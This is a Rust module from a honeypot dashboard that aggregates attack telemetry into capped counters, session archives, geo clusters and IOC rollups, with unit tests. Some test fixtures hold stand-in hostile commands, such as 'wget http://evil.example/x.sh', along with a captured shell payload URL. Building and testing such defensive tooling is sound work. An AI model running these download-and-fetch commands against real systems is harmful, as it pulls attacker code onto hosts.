//! In-memory aggregation of the honeypot's `attacks.json` telemetry stream.
//!
//! `Store` is fed one [`TelemetryEvent`] at a time by the tailer in `main.rs`
//! and keeps running counters plus a capped ring buffer of recent raw events
//! for the live feed. Nothing here touches disk — it only ever sees events
//! the tailer has already parsed.

use aegis_common::{GeoIpInfo, TelemetryEvent};
use chrono::{DateTime, Utc};
use serde::Serialize;
use std::collections::{BTreeMap, HashMap, HashSet, VecDeque};
use std::net::IpAddr;

/// How many of the most recent events are kept verbatim for the live feed.
const RECENT_CAP: usize = 500;
/// How many hours of activity history are retained internally (the API only
/// ever exposes the most recent 24 of these).
const HOURLY_WINDOW_HOURS: i64 = 48;
/// Size of each "top N" ranking (top usernames, passwords, commands).
const TOP_N: usize = 10;
/// How many sessions the archive keeps (oldest evicted first once exceeded).
/// This is deliberately much bigger than `RECENT_CAP` — the archive holds
/// per-session *summaries* (a handful of counters), not full event bodies,
/// so it's cheap to keep far more history than the live event ring buffer.
const SESSION_ARCHIVE_CAP: usize = 5000;
/// Cap on distinct IOC values (IPs/URLs/wallets) and distinct full command
/// strings remembered for the all-time rollups. Attacker scripts often
/// embed randomized tokens, so without a cap these sets could grow without
/// bound over a long-running deployment; once full, new never-seen-before
/// values stop being added but everything already remembered stays.
const IOC_CAP: usize = 500;
const COMMAND_CAP: usize = 3000;
/// Cap on distinct keys retained in each rolling counter map.
///
/// The same reasoning as `COMMAND_CAP` above, applied to the maps that were
/// missed: `username_counts`, `password_counts`, `command_counts`, `ip_counts`
/// and `unique_ips` are all keyed by values an attacker supplies directly and
/// were previously unbounded. Credential-stuffing traffic — which is the
/// *normal* load on a honeypot, not an unusual attack — supplies a fresh
/// username and password on every attempt, so the maps grew until the process
/// was OOM-killed, taking the operator's visibility with it at exactly the
/// moment it was needed. These maps only ever feed `top_n` (TOP_N = 10), so
/// exact long-tail counts have no value; keeping the heavy hitters is enough.
const COUNTER_CAP: usize = 10_000;

#[derive(Default)]
pub struct Store {
    total_sessions: u64,
    total_commands: u64,
    total_credentials: u64,
    total_payloads: u64,
    unique_ips: HashSet<IpAddr>,
    ip_counts: HashMap<IpAddr, u64>,
    /// Keyed by country name from `SessionStartEvent.geo`. The synthetic
    /// "Local" tag (private/loopback IPs — see `aegis-gateway::geoip`) is
    /// deliberately excluded here: it's not a real country and would just
    /// dominate the ranking during local testing.
    country_counts: HashMap<String, u64>,
    username_counts: HashMap<String, u64>,
    password_counts: HashMap<String, u64>,
    command_counts: HashMap<String, u64>,
    hourly_activity: BTreeMap<i64, u64>,
    recent: VecDeque<TelemetryEvent>,

    /// Per-session archive, independent of `recent`'s cap — see
    /// `SESSION_ARCHIVE_CAP`. Keyed by session id.
    sessions: HashMap<String, SessionRecord>,
    /// Session ids in start order, oldest first — drives both "newest
    /// first" listing (iterate in reverse) and archive eviction (pop front).
    session_order: VecDeque<String>,

    /// Geo points bucketed to 0.5° lat/lon cells (keyed as `(lat*2, lon*2)`
    /// rounded to the nearest integer) so a busy honeypot doesn't end up
    /// with one map marker per session — nearby sessions accumulate onto
    /// the same bucket instead.
    geo_points: HashMap<(i32, i32), GeoPoint>,

    /// All-time distinct IOC values extracted from captured payloads,
    /// across every payload ever seen (not just the currently-buffered
    /// ones) — see `IOC_CAP`.
    known_ip_iocs: HashSet<String>,
    known_url_iocs: HashSet<String>,
    known_wallet_iocs: HashSet<String>,
    /// Full command strings ever seen (distinct from `command_counts`,
    /// which only tracks the first whitespace-separated verb) — used to
    /// flag a command as novel the first time it's ever run. See
    /// `COMMAND_CAP`.
    known_full_commands: HashSet<String>,
}

impl Store {
    /// Fold one telemetry event into the running aggregates and push it onto
    /// the recent-events ring buffer.
    pub fn ingest(&mut self, event: TelemetryEvent) {
        self.bump_hour(event_timestamp(&event));

        let ip = event_ip(&event);
        if self.unique_ips.contains(&ip) || self.unique_ips.len() < COUNTER_CAP {
            self.unique_ips.insert(ip);
        }
        bump_capped(&mut self.ip_counts, ip, COUNTER_CAP);

        match &event {
            TelemetryEvent::SessionStart(e) => {
                self.total_sessions += 1;
                if let Some(country) = e.geo.as_ref().and_then(|g| g.country.as_deref()) {
                    if country != "Local" {
                        // Bounded in practice (~200 countries), but capped for
                        // consistency — the value still originates in a file.
                        bump_capped(&mut self.country_counts, country.to_string(), COUNTER_CAP);
                    }
                }
                self.bump_geo_point(e.geo.as_ref());
                self.archive_session_start(&e.session_id.0, e.ip, e.port, e.geo.clone(), e.timestamp);
            }
            TelemetryEvent::SessionEnd(e) => {
                if let Some(rec) = self.sessions.get_mut(&e.session_id.0) {
                    rec.end_time = Some(e.timestamp);
                    rec.duration_secs = Some(e.duration_secs);
                }
            }
            TelemetryEvent::CommandRun(e) => {
                self.total_commands += 1;
                let verb = e.command.split_whitespace().next().unwrap_or(&e.command);
                bump_capped(&mut self.command_counts, verb.to_string(), COUNTER_CAP);
                insert_capped(&mut self.known_full_commands, e.command.clone(), COMMAND_CAP);
                if let Some(rec) = self.sessions.get_mut(&e.session_id.0) {
                    rec.command_count += 1;
                }
            }
            TelemetryEvent::CredentialHarvest(e) => {
                self.total_credentials += 1;
                bump_capped(&mut self.username_counts, e.username.clone(), COUNTER_CAP);
                if let Some(pw) = &e.password {
                    bump_capped(&mut self.password_counts, pw.clone(), COUNTER_CAP);
                }
                if let Some(rec) = self.sessions.get_mut(&e.session_id.0) {
                    rec.username = Some(e.username.clone());
                    rec.password = e.password.clone();
                }
            }
            TelemetryEvent::PayloadCaptured(e) => {
                self.total_payloads += 1;
                if let Some(rec) = self.sessions.get_mut(&e.session_id.0) {
                    rec.payload_count += 1;
                }
                for v in &e.iocs.ip_addresses {
                    insert_capped(&mut self.known_ip_iocs, v.clone(), IOC_CAP);
                }
                for v in &e.iocs.urls {
                    insert_capped(&mut self.known_url_iocs, v.clone(), IOC_CAP);
                }
                for v in &e.iocs.monero_wallets {
                    insert_capped(&mut self.known_wallet_iocs, v.clone(), IOC_CAP);
                }
            }
            TelemetryEvent::SyscallExecve(_)
            | TelemetryEvent::SyscallConnect(_)
            | TelemetryEvent::SyscallMemfdCreate(_) => {}
        }

        self.recent.push_back(event);
        while self.recent.len() > RECENT_CAP {
            self.recent.pop_front();
        }
    }

    fn bump_hour(&mut self, ts: DateTime<Utc>) {
        let hour = ts.timestamp().div_euclid(3600);
        *self.hourly_activity.entry(hour).or_insert(0) += 1;
        let cutoff = Utc::now().timestamp().div_euclid(3600) - HOURLY_WINDOW_HOURS;
        self.hourly_activity.retain(|&h, _| h >= cutoff);
    }

    fn bump_geo_point(&mut self, geo: Option<&GeoIpInfo>) {
        let Some(geo) = geo else { return };
        let (Some(lat), Some(lon)) = (geo.lat, geo.lon) else { return };
        let key = ((lat * 2.0).round() as i32, (lon * 2.0).round() as i32);
        let point = self.geo_points.entry(key).or_insert_with(|| GeoPoint {
            lat: key.0 as f64 / 2.0,
            lon: key.1 as f64 / 2.0,
            country: geo.country.clone(),
            city: geo.city.clone(),
            count: 0,
        });
        point.count += 1;
    }

    fn archive_session_start(&mut self, id: &str, ip: IpAddr, port: u16, geo: Option<GeoIpInfo>, start_time: DateTime<Utc>) {
        if !self.sessions.contains_key(id) {
            self.session_order.push_back(id.to_string());
            while self.session_order.len() > SESSION_ARCHIVE_CAP {
                if let Some(oldest) = self.session_order.pop_front() {
                    self.sessions.remove(&oldest);
                }
            }
        }
        self.sessions.insert(
            id.to_string(),
            SessionRecord {
                session_id: id.to_string(),
                ip,
                port,
                geo,
                start_time,
                end_time: None,
                duration_secs: None,
                username: None,
                password: None,
                command_count: 0,
                payload_count: 0,
            },
        );
    }

    pub fn summary(&self) -> Summary {
        Summary {
            total_sessions: self.total_sessions,
            total_commands: self.total_commands,
            total_credentials: self.total_credentials,
            total_payloads: self.total_payloads,
            unique_ips: self.unique_ips.len() as u64,
            top_usernames: top_n(&self.username_counts),
            top_passwords: top_n(&self.password_counts),
            top_commands: top_n(&self.command_counts),
            top_ips: top_n_ip(&self.ip_counts),
            top_countries: top_n(&self.country_counts),
            top_threat_ips: self.top_threat_ips(),
            hourly_activity: self
                .hourly_activity
                .iter()
                .rev()
                .take(24)
                .map(|(&hour, &count)| HourBucket {
                    hour: DateTime::from_timestamp(hour * 3600, 0)
                        .unwrap_or_default()
                        .to_rfc3339(),
                    count,
                })
                .collect::<Vec<_>>()
                .into_iter()
                .rev()
                .collect(),
        }
    }

    /// Per-source-IP threat leaderboard: each session's `threat_score()`
    /// summed across every session archived for that IP. Reuses `top_n_ip`
    /// (generic over any `u64` count) with the score standing in for count.
    fn top_threat_ips(&self) -> Vec<Ranked> {
        let mut agg: HashMap<IpAddr, u64> = HashMap::new();
        for rec in self.sessions.values() {
            *agg.entry(rec.ip).or_insert(0) += rec.threat_score();
        }
        top_n_ip(&agg)
    }

    /// Most recent events, newest first, optionally filtered to one event
    /// kind (matched against [`event_kind`], case-insensitively) and/or one
    /// source IP.
    pub fn recent_events(&self, limit: usize, kind: Option<&str>, ip: Option<IpAddr>) -> Vec<&TelemetryEvent> {
        self.recent
            .iter()
            .rev()
            .filter(|e| kind.map(|k| event_kind(e).eq_ignore_ascii_case(k)).unwrap_or(true))
            .filter(|e| ip.map(|target| event_ip(e) == target).unwrap_or(true))
            .take(limit)
            .collect()
    }

    /// Every buffered event belonging to one session, oldest first — the
    /// full (recent-window-bounded) timeline for a session drill-down view.
    pub fn session_events(&self, session_id: &str) -> Vec<&TelemetryEvent> {
        self.recent
            .iter()
            .filter(|e| e.session_id().map(|id| id.0 == session_id).unwrap_or(false))
            .collect()
    }

    /// Session archive, newest-first, optionally filtered to one source IP
    /// and/or a case-insensitive substring match against session id, IP,
    /// username, or password. Returns the matching page plus the total
    /// match count (for "N of M" / load-more UI).
    pub fn sessions(&self, q: Option<&str>, ip: Option<IpAddr>, limit: usize, offset: usize) -> (Vec<SessionSummary>, usize) {
        let needle = q.map(|s| s.to_lowercase());
        let matches: Vec<&SessionRecord> = self
            .session_order
            .iter()
            .rev()
            .filter_map(|id| self.sessions.get(id))
            .filter(|r| ip.map(|target| r.ip == target).unwrap_or(true))
            .filter(|r| {
                needle
                    .as_ref()
                    .map(|n| {
                        r.session_id.to_lowercase().contains(n)
                            || r.ip.to_string().contains(n)
                            || r.username.as_deref().unwrap_or("").to_lowercase().contains(n)
                            || r.password.as_deref().unwrap_or("").to_lowercase().contains(n)
                    })
                    .unwrap_or(true)
            })
            .collect();
        let total = matches.len();
        let page = matches.into_iter().skip(offset).take(limit).map(SessionRecord::to_summary).collect();
        (page, total)
    }

    /// Aggregated geo points for the map view, largest cluster first.
    pub fn geo_points(&self) -> Vec<GeoPoint> {
        let mut points: Vec<GeoPoint> = self.geo_points.values().cloned().collect();
        points.sort_by(|a, b| b.count.cmp(&a.count));
        points
    }

    /// All-time distinct IOC values extracted from captured payloads.
    pub fn ioc_rollup(&self) -> IocRollup {
        IocRollup {
            ip_addresses: sorted_vec(&self.known_ip_iocs),
            urls: sorted_vec(&self.known_url_iocs),
            monero_wallets: sorted_vec(&self.known_wallet_iocs),
        }
    }

    /// Every distinct username, password, and full command string ever
    /// seen — used client-side to flag first-ever occurrences ("NEW"
    /// badges) in the live feed.
    pub fn known_values(&self) -> KnownValues {
        KnownValues {
            usernames: self.username_counts.keys().cloned().collect(),
            passwords: self.password_counts.keys().cloned().collect(),
            commands: sorted_vec(&self.known_full_commands),
        }
    }
}

/// Insert `val` into `set` unless the set is already at `cap` and doesn't
/// already contain it — bounds memory use for open-ended attacker-supplied
/// strings while letting anything already tracked stay tracked.
fn insert_capped(set: &mut HashSet<String>, val: String, cap: usize) {
    if set.contains(&val) || set.len() < cap {
        set.insert(val);
    }
}

/// Increment `key`'s counter, refusing to introduce a *new* key once the map is
/// full. Already-tracked keys keep counting accurately, so the heavy hitters
/// that the rankings actually surface are unaffected by the cap.
fn bump_capped<K: std::hash::Hash + Eq>(map: &mut HashMap<K, u64>, key: K, cap: usize) {
    if let Some(count) = map.get_mut(&key) {
        *count += 1;
    } else if map.len() < cap {
        map.insert(key, 1);
    }
}

fn sorted_vec(set: &HashSet<String>) -> Vec<String> {
    let mut v: Vec<String> = set.iter().cloned().collect();
    v.sort();
    v
}

fn top_n(counts: &HashMap<String, u64>) -> Vec<Ranked> {
    let mut ranked: Vec<Ranked> = counts
        .iter()
        .map(|(value, &count)| Ranked { value: value.clone(), count })
        .collect();
    ranked.sort_by(|a, b| b.count.cmp(&a.count).then_with(|| a.value.cmp(&b.value)));
    ranked.truncate(TOP_N);
    ranked
}

fn top_n_ip(counts: &HashMap<IpAddr, u64>) -> Vec<Ranked> {
    let mut ranked: Vec<Ranked> = counts
        .iter()
        .map(|(ip, &count)| Ranked { value: ip.to_string(), count })
        .collect();
    ranked.sort_by(|a, b| b.count.cmp(&a.count).then_with(|| a.value.cmp(&b.value)));
    ranked.truncate(TOP_N);
    ranked
}

fn event_timestamp(event: &TelemetryEvent) -> DateTime<Utc> {
    match event {
        TelemetryEvent::SessionStart(e) => e.timestamp,
        TelemetryEvent::SessionEnd(e) => e.timestamp,
        TelemetryEvent::CredentialHarvest(e) => e.timestamp,
        TelemetryEvent::CommandRun(e) => e.timestamp,
        TelemetryEvent::SyscallExecve(e) => e.timestamp,
        TelemetryEvent::SyscallConnect(e) => e.timestamp,
        TelemetryEvent::SyscallMemfdCreate(e) => e.timestamp,
        TelemetryEvent::PayloadCaptured(e) => e.timestamp,
    }
}

fn event_ip(event: &TelemetryEvent) -> IpAddr {
    match event {
        TelemetryEvent::SessionStart(e) => e.ip,
        TelemetryEvent::SessionEnd(e) => e.ip,
        TelemetryEvent::CredentialHarvest(e) => e.ip,
        TelemetryEvent::CommandRun(e) => e.ip,
        TelemetryEvent::SyscallExecve(e) => e.ip,
        TelemetryEvent::SyscallConnect(e) => e.ip,
        TelemetryEvent::SyscallMemfdCreate(e) => e.ip,
        TelemetryEvent::PayloadCaptured(e) => e.ip,
    }
}

/// The `event` tag as written in `attacks.json` (matches `TelemetryEvent`'s
/// `#[serde(tag = "event", ...)]` representation).
pub fn event_kind(event: &TelemetryEvent) -> &'static str {
    match event {
        TelemetryEvent::SessionStart(_) => "SESSION_START",
        TelemetryEvent::SessionEnd(_) => "SESSION_END",
        TelemetryEvent::CredentialHarvest(_) => "CREDENTIAL_HARVEST",
        TelemetryEvent::CommandRun(_) => "COMMAND_RUN",
        TelemetryEvent::SyscallExecve(_) => "SYSCALL_EXECVE",
        TelemetryEvent::SyscallConnect(_) => "SYSCALL_CONNECT",
        TelemetryEvent::SyscallMemfdCreate(_) => "SYSCALL_MEMFD_CREATE",
        TelemetryEvent::PayloadCaptured(_) => "PAYLOAD_CAPTURED",
    }
}

#[derive(Serialize)]
pub struct Ranked {
    pub value: String,
    pub count: u64,
}

#[derive(Serialize)]
pub struct HourBucket {
    pub hour: String,
    pub count: u64,
}

#[derive(Serialize)]
pub struct Summary {
    pub total_sessions: u64,
    pub total_commands: u64,
    pub total_credentials: u64,
    pub total_payloads: u64,
    pub unique_ips: u64,
    pub top_usernames: Vec<Ranked>,
    pub top_passwords: Vec<Ranked>,
    pub top_commands: Vec<Ranked>,
    pub top_ips: Vec<Ranked>,
    pub top_countries: Vec<Ranked>,
    /// Per-IP leaderboard by cumulative `SessionRecord::threat_score()`
    /// rather than raw event count — surfaces the attackers who actually
    /// *did* something (dropped payloads, ran lots of commands) above ones
    /// who just knocked and left.
    pub top_threat_ips: Vec<Ranked>,
    pub hourly_activity: Vec<HourBucket>,
}

/// One bucketed cluster of session origins for the geo map — see
/// `Store::bump_geo_point`.
#[derive(Serialize, Clone)]
pub struct GeoPoint {
    pub lat: f64,
    pub lon: f64,
    pub country: Option<String>,
    pub city: Option<String>,
    pub count: u64,
}

#[derive(Serialize)]
pub struct IocRollup {
    pub ip_addresses: Vec<String>,
    pub urls: Vec<String>,
    pub monero_wallets: Vec<String>,
}

#[derive(Serialize)]
pub struct KnownValues {
    pub usernames: Vec<String>,
    pub passwords: Vec<String>,
    pub commands: Vec<String>,
}

/// Per-session rollup kept in the archive, independent of the recent-events
/// ring buffer — see `SESSION_ARCHIVE_CAP`.
struct SessionRecord {
    session_id: String,
    ip: IpAddr,
    port: u16,
    geo: Option<GeoIpInfo>,
    start_time: DateTime<Utc>,
    end_time: Option<DateTime<Utc>>,
    duration_secs: Option<f64>,
    username: Option<String>,
    password: Option<String>,
    command_count: u64,
    payload_count: u64,
}

impl SessionRecord {
    /// Cheap triage heuristic, not a rigorous risk model: commands run
    /// count 1 point each, successfully harvesting credentials is worth a
    /// flat 5 (an attacker got *something*, regardless of how many auth
    /// attempts it took), and each captured payload — actual malware or
    /// tooling dropped — is worth 25, since that's the single strongest
    /// signal of real intent versus an idle scanner.
    fn threat_score(&self) -> u64 {
        let mut score = self.command_count;
        if self.username.is_some() {
            score += 5;
        }
        score += self.payload_count * 25;
        score
    }

    fn to_summary(&self) -> SessionSummary {
        SessionSummary {
            session_id: self.session_id.clone(),
            ip: self.ip.to_string(),
            port: self.port,
            geo: self.geo.clone(),
            start_time: self.start_time.to_rfc3339(),
            end_time: self.end_time.map(|t| t.to_rfc3339()),
            duration_secs: self.duration_secs,
            username: self.username.clone(),
            password: self.password.clone(),
            command_count: self.command_count,
            payload_count: self.payload_count,
            threat_score: self.threat_score(),
        }
    }
}

#[derive(Serialize)]
pub struct SessionSummary {
    pub session_id: String,
    pub ip: String,
    pub port: u16,
    pub geo: Option<GeoIpInfo>,
    pub start_time: String,
    pub end_time: Option<String>,
    pub duration_secs: Option<f64>,
    pub username: Option<String>,
    pub password: Option<String>,
    pub command_count: u64,
    pub payload_count: u64,
    pub threat_score: u64,
}

#[cfg(test)]
mod tests {
    use super::*;
    use aegis_common::{CommandRunEvent, CredentialHarvestEvent, GeoIpInfo, SessionId, SessionStartEvent, AuthMethod};
    use std::net::Ipv4Addr;

    fn ip() -> IpAddr {
        IpAddr::V4(Ipv4Addr::new(203, 0, 113, 5))
    }

    #[test]
    fn aggregates_credentials_and_commands() {
        let mut store = Store::default();
        store.ingest(TelemetryEvent::CredentialHarvest(CredentialHarvestEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: ip(),
            username: "root".into(),
            password: Some("123456".into()),
            auth_method: AuthMethod::Password,
        }));
        store.ingest(TelemetryEvent::CommandRun(CommandRunEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: ip(),
            command: "wget http://evil.example/x.sh".into(),
        }));

        let summary = store.summary();
        assert_eq!(summary.total_credentials, 1);
        assert_eq!(summary.total_commands, 1);
        assert_eq!(summary.unique_ips, 1);
        assert_eq!(summary.top_usernames[0].value, "root");
        assert_eq!(summary.top_passwords[0].value, "123456");
        assert_eq!(summary.top_commands[0].value, "wget");
    }

    #[test]
    fn recent_events_filters_by_kind_and_caps_at_limit() {
        let mut store = Store::default();
        for i in 0..5 {
            store.ingest(TelemetryEvent::CommandRun(CommandRunEvent {
                timestamp: Utc::now(),
                session_id: SessionId::new(),
                ip: ip(),
                command: format!("cmd{i}"),
            }));
        }
        store.ingest(TelemetryEvent::CredentialHarvest(CredentialHarvestEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: ip(),
            username: "admin".into(),
            password: None,
            auth_method: AuthMethod::Password,
        }));

        let all = store.recent_events(100, None, None);
        assert_eq!(all.len(), 6);

        let cmds_only = store.recent_events(100, Some("command_run"), None);
        assert_eq!(cmds_only.len(), 5);

        let capped = store.recent_events(2, None, None);
        assert_eq!(capped.len(), 2);
        // Newest first: the credential-harvest event was ingested last.
        assert!(matches!(capped[0], TelemetryEvent::CredentialHarvest(_)));
    }

    #[test]
    fn recent_ring_buffer_is_capped() {
        let mut store = Store::default();
        for i in 0..(RECENT_CAP + 50) {
            store.ingest(TelemetryEvent::CommandRun(CommandRunEvent {
                timestamp: Utc::now(),
                session_id: SessionId::new(),
                ip: ip(),
                command: format!("cmd{i}"),
            }));
        }
        assert_eq!(store.recent_events(usize::MAX, None, None).len(), RECENT_CAP);
        assert_eq!(store.summary().total_commands, (RECENT_CAP + 50) as u64);
    }

    #[test]
    fn tracks_top_ips_and_filters_events_by_ip() {
        let mut store = Store::default();
        let other_ip = IpAddr::V4(Ipv4Addr::new(198, 51, 100, 9));

        for _ in 0..3 {
            store.ingest(TelemetryEvent::CommandRun(CommandRunEvent {
                timestamp: Utc::now(),
                session_id: SessionId::new(),
                ip: ip(),
                command: "id".into(),
            }));
        }
        store.ingest(TelemetryEvent::CommandRun(CommandRunEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: other_ip,
            command: "whoami".into(),
        }));

        let summary = store.summary();
        assert_eq!(summary.unique_ips, 2);
        assert_eq!(summary.top_ips[0].value, ip().to_string());
        assert_eq!(summary.top_ips[0].count, 3);

        let filtered = store.recent_events(100, None, Some(other_ip));
        assert_eq!(filtered.len(), 1);
        assert!(matches!(filtered[0], TelemetryEvent::CommandRun(e) if e.command == "whoami"));
    }

    #[test]
    fn session_events_returns_only_that_sessions_timeline_oldest_first() {
        let mut store = Store::default();
        let target = SessionId::new();

        store.ingest(TelemetryEvent::CredentialHarvest(CredentialHarvestEvent {
            timestamp: Utc::now(),
            session_id: target.clone(),
            ip: ip(),
            username: "root".into(),
            password: Some("toor".into()),
            auth_method: AuthMethod::Password,
        }));
        store.ingest(TelemetryEvent::CommandRun(CommandRunEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: ip(),
            command: "not this session".into(),
        }));
        store.ingest(TelemetryEvent::CommandRun(CommandRunEvent {
            timestamp: Utc::now(),
            session_id: target.clone(),
            ip: ip(),
            command: "whoami".into(),
        }));

        let timeline = store.session_events(&target.0);
        assert_eq!(timeline.len(), 2);
        assert!(matches!(timeline[0], TelemetryEvent::CredentialHarvest(_)));
        assert!(matches!(timeline[1], TelemetryEvent::CommandRun(e) if e.command == "whoami"));
    }

    #[test]
    fn top_countries_counts_real_countries_and_excludes_local() {
        let mut store = Store::default();

        store.ingest(TelemetryEvent::SessionStart(SessionStartEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: ip(),
            port: 4444,
            geo: Some(GeoIpInfo { country: Some("Sweden".into()), city: Some("Linköping".into()), ..Default::default() }),
        }));
        store.ingest(TelemetryEvent::SessionStart(SessionStartEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: ip(),
            port: 4445,
            geo: Some(GeoIpInfo { country: Some("Sweden".into()), ..Default::default() }),
        }));
        // A loopback/private test connection tagged "Local" must not pollute
        // the country ranking.
        store.ingest(TelemetryEvent::SessionStart(SessionStartEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: ip(),
            port: 4446,
            geo: Some(GeoIpInfo { country: Some("Local".into()), ..Default::default() }),
        }));
        // No GeoIP configured at all for this one — must not panic or count.
        store.ingest(TelemetryEvent::SessionStart(SessionStartEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: ip(),
            port: 4447,
            geo: None,
        }));

        let summary = store.summary();
        assert_eq!(summary.total_sessions, 4);
        assert_eq!(summary.top_countries.len(), 1);
        assert_eq!(summary.top_countries[0].value, "Sweden");
        assert_eq!(summary.top_countries[0].count, 2);
    }

    #[test]
    fn geo_points_bucket_nearby_sessions_together() {
        let mut store = Store::default();
        for _ in 0..2 {
            store.ingest(TelemetryEvent::SessionStart(SessionStartEvent {
                timestamp: Utc::now(),
                session_id: SessionId::new(),
                ip: ip(),
                port: 4444,
                geo: Some(GeoIpInfo {
                    country: Some("Germany".into()),
                    city: Some("Frankfurt".into()),
                    lat: Some(50.11),
                    lon: Some(8.68),
                    ..Default::default()
                }),
            }));
        }
        // Far enough away to land in a different 0.5° bucket.
        store.ingest(TelemetryEvent::SessionStart(SessionStartEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: ip(),
            port: 4445,
            geo: Some(GeoIpInfo { country: Some("Sweden".into()), lat: Some(59.3), lon: Some(18.1), ..Default::default() }),
        }));
        // No lat/lon at all — must be silently skipped, not panic.
        store.ingest(TelemetryEvent::SessionStart(SessionStartEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: ip(),
            port: 4446,
            geo: Some(GeoIpInfo { country: Some("Local".into()), ..Default::default() }),
        }));

        let points = store.geo_points();
        assert_eq!(points.len(), 2);
        assert_eq!(points[0].count, 2);
        assert_eq!(points[0].city.as_deref(), Some("Frankfurt"));
        assert_eq!(points[1].count, 1);
    }

    #[test]
    fn session_archive_tracks_counts_and_computes_threat_score() {
        use aegis_common::{PayloadCapturedEvent, PayloadFileType, IocFindings, SessionEndEvent};

        let mut store = Store::default();
        let target = SessionId::new();

        store.ingest(TelemetryEvent::SessionStart(SessionStartEvent {
            timestamp: Utc::now(),
            session_id: target.clone(),
            ip: ip(),
            port: 5555,
            geo: Some(GeoIpInfo { country: Some("Germany".into()), ..Default::default() }),
        }));
        store.ingest(TelemetryEvent::CredentialHarvest(CredentialHarvestEvent {
            timestamp: Utc::now(),
            session_id: target.clone(),
            ip: ip(),
            username: "root".into(),
            password: Some("toor".into()),
            auth_method: AuthMethod::Password,
        }));
        for i in 0..3 {
            store.ingest(TelemetryEvent::CommandRun(CommandRunEvent {
                timestamp: Utc::now(),
                session_id: target.clone(),
                ip: ip(),
                command: format!("wget http://evil.example/{i}.sh"),
            }));
        }
        store.ingest(TelemetryEvent::PayloadCaptured(PayloadCapturedEvent {
            timestamp: Utc::now(),
            session_id: target.clone(),
            ip: ip(),
            source_url: Some("http://evil.example/0.sh".into()),
            sha256: "deadbeef".into(),
            size_bytes: 42,
            quarantine_path: "./quarantine/deadbeef".into(),
            file_type: PayloadFileType::Shell,
            iocs: IocFindings { ip_addresses: vec!["198.51.100.99".into()], urls: vec!["http://evil.example/0.sh".into()], ..Default::default() },
        }));
        store.ingest(TelemetryEvent::SessionEnd(SessionEndEvent {
            timestamp: Utc::now(),
            session_id: target.clone(),
            ip: ip(),
            duration_secs: 12.5,
        }));

        let (page, total) = store.sessions(None, None, 10, 0);
        assert_eq!(total, 1);
        let s = &page[0];
        assert_eq!(s.session_id, target.0);
        assert_eq!(s.command_count, 3);
        assert_eq!(s.payload_count, 1);
        assert_eq!(s.username.as_deref(), Some("root"));
        assert_eq!(s.duration_secs, Some(12.5));
        // 3 commands + 5 (harvested creds) + 25 (one payload) = 33
        assert_eq!(s.threat_score, 33);

        // Search matches on username and is case-insensitive.
        let (found, _) = store.sessions(Some("ROOT"), None, 10, 0);
        assert_eq!(found.len(), 1);
        let (none, _) = store.sessions(Some("nope"), None, 10, 0);
        assert!(none.is_empty());

        let rollup = store.ioc_rollup();
        assert_eq!(rollup.ip_addresses, vec!["198.51.100.99".to_string()]);
        assert_eq!(rollup.urls, vec!["http://evil.example/0.sh".to_string()]);

        let threat_ips = store.summary().top_threat_ips;
        assert_eq!(threat_ips[0].value, ip().to_string());
        assert_eq!(threat_ips[0].count, 33);

        let known = store.known_values();
        assert!(known.usernames.contains(&"root".to_string()));
        assert!(known.commands.iter().any(|c| c.starts_with("wget http://evil.example/0.sh")));
    }

    #[test]
    fn session_archive_evicts_oldest_past_cap() {
        let mut store = Store::default();
        for i in 0..(SESSION_ARCHIVE_CAP + 10) {
            store.ingest(TelemetryEvent::SessionStart(SessionStartEvent {
                timestamp: Utc::now(),
                session_id: SessionId(format!("sess{i:06}")),
                ip: ip(),
                port: 4444,
                geo: None,
            }));
        }
        let (_, total) = store.sessions(None, None, usize::MAX, 0);
        assert_eq!(total, SESSION_ARCHIVE_CAP);
        // The very first session archived should have been evicted.
        let (found, _) = store.sessions(Some("sess000000"), None, 10, 0);
        assert!(found.is_empty());
        // A recent one should still be present.
        let (found, _) = store.sessions(Some("sess000015"), None, 10, 0);
        assert_eq!(found.len(), 1);
    }
}
